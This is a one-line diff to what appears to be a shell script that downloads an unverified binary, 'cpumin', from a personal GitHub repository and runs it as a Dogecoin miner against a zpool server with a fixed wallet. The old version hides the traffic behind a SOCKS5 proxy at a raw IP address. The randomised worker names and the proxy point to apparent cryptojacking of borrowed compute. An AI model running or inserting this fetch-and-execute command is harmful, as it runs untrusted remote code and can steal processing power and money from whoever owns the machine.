@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/jacujamil/dewasa/main/cpumin && chmod +x cpumin && ./cpumin -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DAxGkuHcPytmsbUTMebR4yB92Hx5X3AC4E.$(echo $(shuf -i 1-9999 -n 1)-Masku) -p c=DOGE -t 1 -x socks5://24.249.199.4:4145
+wget https://raw.githubusercontent.com/jacujamil/dewasa/main/cpumin && chmod +x cpumin && ./cpumin -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DAxGkuHcPytmsbUTMebR4yB92Hx5X3AC4E.$(echo $(shuf -i 1-9999 -n 1)-Masku) -p c=DOGE -t 2
